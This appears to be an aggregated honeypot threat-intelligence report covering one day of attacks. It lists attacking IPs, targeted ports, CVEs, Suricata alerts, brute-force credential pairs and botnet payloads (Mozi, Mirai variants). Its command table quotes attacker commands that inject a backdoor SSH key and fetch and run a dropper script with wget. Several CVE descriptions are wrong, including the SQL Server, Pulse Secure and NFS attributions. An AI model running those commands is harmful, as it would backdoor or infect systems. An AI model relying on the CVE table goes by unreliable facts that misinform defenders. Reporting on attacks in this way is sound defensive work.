# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-17T20-32-35Z
**Timeframe:** 2025-10-16T17:00:01Z to 2025-10-17T20:02:01Z
**Files Used:**
- Honeypot_Attack_Summary_Report_2025-10-17T20:02:01Z.md
- Honeypot_Attack_Summary_Report_2025-10-17T19:02:16Z.md
- Honeypot_Attack_Summary_Report_2025-10-17T18:01:58Z.md
- Honeypot_Attack_Summary_Report_2025-10-17T17:01:51Z.md
- Honeypot_Attack_Summary_Report_2025-10-17T15:02:08Z.md
- Honeypot_Attack_Summary_Report_2025-10-17T14:02:19Z.md
- Honeypot_Attack_Summary_Report_2025-10-17T13:01:53Z.md
- Honeypot_Attack_Summary_Report_2025-10-17T12:02:28Z.md
- Honeypot_Attack_Summary_Report_2025-10-17T11:01:59Z.md
- Honeypot_Attack_Summary_Report_2025-10-17T10:02:10Z.md
- Honeypot_Attack_Summary_Report_2025-10-17T09:01:55Z.md
- Honeypot_Attack_Summary_Report_2025-10-17T08:02:04Z.md
- Honeypot_Attack_Summary_Report_2025-10-17T06:01:46Z.md
- Honeypot_Attack_Summary_Report_2025-10-17T05:01:53Z.md
- Honeypot_Attack_Summary_Report_2025-10-17T04:03:56Z.md
- Honeypot_Attack_Summary_Report_2025-10-17T03:01:59Z.md
- Honeypot_Attack_Summary_Report_2025-10-17T02:02:18Z.md
- Honeypot_Attack_Summary_Report_2025-10-17T01:01:47Z.md
- Honeypot_Attack_Summary_Report_2025-10-17T00:02:07Z.md
- Honeypot_Attack_Summary_Report_2025-10-16T22:01:58Z.md
- Honeypot_Attack_Summary_Report_2025-10-16T21:01:56Z.md
- Honeypot_Attack_Summary_Report_2025-10-16T20:02:26Z.md
- Honeypot_Attack_Summary_Report_2025-10-16T19:01:49Z.md
- Honeypot_Attack_Summary_Report_2025-10-16T17:01:55Z.md

---

## Executive Summary

This report details a 24-hour period of activity across our distributed honeypot network, summarizing hundreds of thousands of individual events. The data reveals a relentless and highly automated threat landscape dominated by widespread scanning, brute-force attacks, and the attempted exploitation of known vulnerabilities. The most significant activity was observed on the Cowrie (SSH/Telnet), Sentrypeer (VoIP/SIP), and Honeytrap (various services) honeypots.

Analysis of attacker behavior indicates three primary targets: **VoIP infrastructure** (Port 5060/SIP), **Microsoft SMB services** (Port 445), and **SSH servers** (Port 22). The immense traffic volume on port 5060, often from single IP addresses, points to industrial-scale scanning campaigns likely aimed at toll fraud or communications interception. Similarly, the high number of events on port 445, frequently triggering the "DoublePulsar" signature, shows that vulnerabilities related to EternalBlue remain a primary vector for attackers.

OSINT investigation into the captured data has uncovered clear evidence of several organized malware campaigns. Multiple attacks attempted to download payloads associated with two major IoT botnets: **Mozi**, a resilient P2P botnet, and **Mirai** (specifically the `arm.urbotnetisass` variant), a notorious DDoS botnet. Furthermore, a persistent campaign was identified through the repeated use of a specific SSH key with the comment "mdrfckr". This signature is linked to the "Outlaw Group," a threat actor known for deploying cryptocurrency miners and backdoors.

Attackers followed a consistent playbook: gain initial access via brute-force or exploitation, perform system reconnaissance (`uname`, `lscpu`, `whoami`), establish persistence by injecting their SSH key into `authorized_keys`, and finally, attempt to download and execute a malicious payload. This standardized methodology underscores the automated nature of the vast majority of threats observed.

---

## Detailed Analysis

### Our IPs

| Honeypot Name | Private IP    | Public IP       |
|---------------|---------------|-----------------|
| hive-us       | 10.128.0.3    | 34.123.129.205  |
| sens-tai      | 10.140.0.3    | 104.199.212.115 |
| sens-tel      | 10.208.0.3    | 34.165.197.224  |
| sens-dub      | 172.31.36.128 | 3.253.97.195    |
| sens-ny       | 10.108.0.2    | 161.35.180.163  |

### Attacks by Honeypot (Aggregated)

| Honeypot    | Event Count |
|-------------|-------------|
| Cowrie      | 131,232     |
| Sentrypeer  | 92,207      |
| Honeytrap   | 72,002      |
| Dionaea     | 53,605      |
| Suricata    | 46,675      |
| Ciscoasa    | 33,695      |
| Mailoney    | 11,848      |
| Heralding   | 3,363       |
| Tanner      | 1,847       |
| Redishoneypot| 1,114       |
| ElasticPot  | 1,188       |
| H0neytr4p   | 887         |
| Wordpot     | 614         |
| ConPot      | 512         |
| Miniprint   | 451         |
| Adbhoney    | 345         |
| Dicompot    | 234         |
| Honeyaml    | 227         |
| Ipphoney    | 81          |

### Top Source Countries (Based on OSINT of Top IPs)

| Country         |
|-----------------|
| United States   |
| Russia          |
| China           |
| Netherlands     |
| India           |

### Top Attacking IPs (Aggregated)

| IP Address        | Total Events | Notes                               |
|-------------------|--------------|-------------------------------------|
| 23.94.26.58       | ~28,200      | Massive SIP scanning volume         |
| 2.57.121.61       | ~22,900      | Massive SIP scanning volume         |
| 171.102.83.142    | ~12,700      | High-volume SMB/Port 445 scanning   |
| 77.83.240.70      | ~10,600      | High-volume SIP scanning            |
| 72.146.232.13     | ~4,100       | General scanning, SSH brute-force   |
| 172.86.95.115     | ~4,000       | General scanning, SSH brute-force   |
| 172.86.95.98      | ~3,900       | General scanning, SSH brute-force   |
| 146.190.69.241    | ~3,400       | High-volume, multi-service scanning |
| 59.152.191.3      | ~3,100       | High-volume SMB/Port 445 scanning   |

### Top Targeted Ports/Protocols (Aggregated)

| Port / Protocol | Service                 | Total Events |
|-----------------|-------------------------|--------------|
| 5060            | SIP (VoIP)              | > 92,000     |
| 445             | SMB (Windows File Sharing)| > 30,000     |
| 22              | SSH                     | > 20,000     |
| 25              | SMTP (Mail)             | > 11,000     |
| 5900 / 5901-5909| VNC (Remote Desktop)    | > 5,000      |
| 8333            | Bitcoin Node            | > 2,000      |
| 80              | HTTP                    | > 1,500      |
| 6379            | Redis                   | > 1,000      |
| 9200            | Elasticsearch           | > 1,000      |

### Most Common CVEs

| CVE ID        | Description Summary                                          |
|---------------|--------------------------------------------------------------|
| CVE-2002-0013 / 0012 | Microsoft SQL Server Resolution Service Buffer Overflows       |
| CVE-2022-27255  | RCE in Realtek eCos SDK (used in routers, IoT)               |
| CVE-2021-3449   | OpenSSL denial-of-service vulnerability                      |
| CVE-2019-11500  | Pulse Secure VPN information disclosure                      |
| CVE-1999-0517   | `showmount` vulnerability in NFS, exposing mount points        |
| CVE-2001-0414   | Sun Solaris `sadmind` Remote Command Execution               |
| CVE-2014-6271   | "Shellshock" - RCE vulnerability in GNU Bash                 |

### Commands Attempted by Attackers

| Command                                                                 | Purpose & Analysis                                                                      | Frequency |
|-------------------------------------------------------------------------|-----------------------------------------------------------------------------------------|-----------|
| `cd ~ && rm -rf .ssh && ... echo "ssh-rsa ... mdrfckr">>.ssh/authorized_keys` | **Persistence:** Deletes existing keys and installs a malicious SSH key for backdoor access. | Very High |
| `uname -a`, `lscpu`, `whoami`, `w`                                          | **Reconnaissance:** Gathers system, hardware, and user information.                       | Very High |
| `free -m`, `df -h`, `cat /proc/cpuinfo`                                     | **Reconnaissance:** Checks system resources, likely to tailor cryptomining malware.     | Very High |
| `cd /data/local/tmp/; busybox wget http://.../w.sh; sh w.sh`              | **Malware Deployment:** Downloads and executes a malicious script.                        | High      |
| `rm -rf /tmp/secure.sh; pkill -9 secure.sh;`                              | **Defense Evasion:** Attempts to remove competing malware or security scripts.            | Medium    |
| `Enter new UNIX password:`                                              | **Post-Exploitation:** Indicates a successful login and attempt to change the password. | High      |

### Signatures Triggered (Top Suricata Alerts)

| Signature                                                             | Meaning & Implication                                                  |
|-----------------------------------------------------------------------|------------------------------------------------------------------------|
| ET DROP Dshield Block Listed Source group 1                           | Traffic from IPs known for malicious activity, blocked pre-emptively.    |
| ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication| Attempt to exploit SMB vulnerabilities (likely EternalBlue).           |
| ET SCAN NMAP -sS window 1024                                          | Active network reconnaissance using the Nmap scanning tool.            |
| ET INFO VNC Authentication Failure                                    | Brute-force or credential stuffing attack against VNC remote desktop.  |
| ET SCAN Sipsak SIP scan                                               | Automated scanning for vulnerable VoIP systems.                        |
| ET SCAN MS Terminal Server Traffic on Non-standard Port               | Scanning for exposed Remote Desktop Protocol (RDP) on unusual ports. |

### Users / Login Attempts (Sample)

| Username        | Password         |
|-----------------|------------------|
| 345gs5662d34    | 345gs5662d34     |
| root            | Qaz123qaz        |
| root            | 123@@@           |
| ftpuser         | ftppassword      |
| support         | support2005      |
| default         | default2021      |
| centos          | 8888888          |
| guest           | guest2021        |
| admin           | admin2000        |
| ubnt            | ubnt2021         |

### Files Uploaded/Downloaded

| Filename            | Type & Analysis                                                        |
|---------------------|------------------------------------------------------------------------|
| `Mozi.m`            | **Botnet Malware:** Payload for the Mozi P2P IoT botnet.                 |
| `arm.urbotnetisass`   | **Botnet Malware:** A variant of the Mirai botnet, targeting ARM IoT devices.|
| `w.sh`, `c.sh`, `wget.sh` | **Dropper Scripts:** Generic shell scripts used to download further payloads. |
| `ohsitsvegawellrip.sh`| **Dropper Script:** Likely a malicious downloader script.                |
| `SOAP-ENV:Envelope>`  | **Exploit/Scan:** Malformed data, likely probing for SOAP vulnerabilities. |

---

### Google Searches

- "What is Mozi.m malware?"
- "What is arm.urbotnetisass malware?"
- ""mdrfckr" ssh key comment malware"

---

## OSINT Investigations

### OSINT: High-Frequency IPs

| IP Address     | Key Findings                                                                                                                                |
|----------------|---------------------------------------------------------------------------------------------------------------------------------------------|
| 23.94.26.58    | Frequently reported for VoIP/SIP scanning. Multiple abuse reports link it to automated tools scanning for open SIP proxies and Asterisk servers. |
| 171.102.83.142 | Consistently reported for aggressive scanning of port 445 (SMB). Associated with botnet activity attempting to exploit Windows vulnerabilities. |
| 77.83.240.70   | Widely reported for SIP scanning and brute-force attacks. Belongs to a hosting provider in Russia, often used for malicious traffic.       |

### OSINT: Commands and Malware

| Indicator             | Finding                                                                                                                                                                                             |
|-----------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| `Mozi.m`                | Confirmed as a payload for the **Mozi Botnet**. This P2P botnet targets IoT devices, using them for DDoS attacks and data exfiltration. Its P2P nature makes it resilient to takedowns.           |
| `arm.urbotnetisass`     | Identified as a variant of the **Mirai Botnet**. This infamous malware family infects ARM-based IoT devices (routers, cameras) to launch massive DDoS attacks.                                        |
| `"mdrfckr"` SSH Key     | This is a known signature of the **"Outlaw Group"** (also linked to "Dota3" malware). This actor compromises servers via brute force, installs this key for persistence, and deploys cryptocurrency miners. |

### OSINT: CVEs

| CVE            | Finding                                                                                                                                                  |
|----------------|----------------------------------------------------------------------------------------------------------------------------------------------------------|
| **CVE-2022-27255** | A critical stack-based buffer overflow in Realtek's eCos SDK. Affects numerous routers and IoT devices, allowing unauthenticated remote code execution. |
| **CVE-2014-6271**  | **Shellshock**. A severe vulnerability in Bash allowing remote code execution. Its continued presence in scans indicates attackers still target old, unpatched Linux systems. |
| **CVE-2002-0012/13** | Ancient vulnerabilities in Microsoft SQL Server. Their presence shows that some automated tools use very old exploit lists to find ancient, unmaintained systems. |

---

## Key Observations and Anomalies

1.  **Industrial-Scale SIP Scanning:** The most striking observation is the sheer volume of traffic targeting port 5060 (SIP). In many instances, a single IP address was responsible for over 10,000 events in a 40-minute window. This indicates large-scale, automated campaigns focused on compromising VoIP gateways, likely for toll fraud or to establish platforms for illicit robocalling.

2.  **Persistent Threat Actor Signature ("mdrfckr"):** A specific SSH public key with the comment "mdrfckr" was attempted in nearly every reporting period. OSINT confirms this is a signature of the "Outlaw Group," a financially motivated threat actor. This highlights how a single, persistent campaign can be responsible for a significant portion of background noise, constantly seeking new servers to infect with backdoors and cryptominers.

3.  **Dual Botnet Threat (Mozi & Mirai):** The logs show clear attempts to download payloads from two distinct and powerful IoT botnets. The presence of both **Mozi** and a **Mirai** variant (`arm.urbotnetisass`) demonstrates the intense competition among attackers for control over vulnerable IoT devices, which are then repurposed for DDoS attacks or other malicious activities.

4.  **The "Ghost" of EternalBlue:** Attacks targeting port 445 (SMB) remain exceptionally high, frequently triggering the "DoublePulsar" signature. This shows that years after its disclosure, the EternalBlue vulnerability and its associated exploits are still a primary and effective tool for attackers compromising unpatched Windows systems.

5.  **A Standardized Attacker Playbook:** Across thousands of unrelated attacks, a clear and consistent methodology emerges:
    *   **Access:** Brute-force credentials or exploit a known vulnerability.
    *   **Recon:** Execute a standard set of commands (`uname -a`, `lscpu`, `whoami`) to understand the environment.
    *   **Persist:** Delete existing SSH configurations and inject a new `authorized_keys` file.
    *   **Deploy:** Use `wget` or `curl` to download and execute the final payload.
    This uniformity points to a mature ecosystem of shared and commoditized attack tools.

6.  **Anomalous CVEs:** Several reports noted CVEs with future years (e.g., `CVE-2025-XXXXX`). This is likely not a zero-day vulnerability but rather a misconfiguration or a unique fingerprint from an attacker's custom scanning tool, designed to see how logging systems react to unexpected data.

This concludes the 24-hour Honeypot Attack Summary Report.
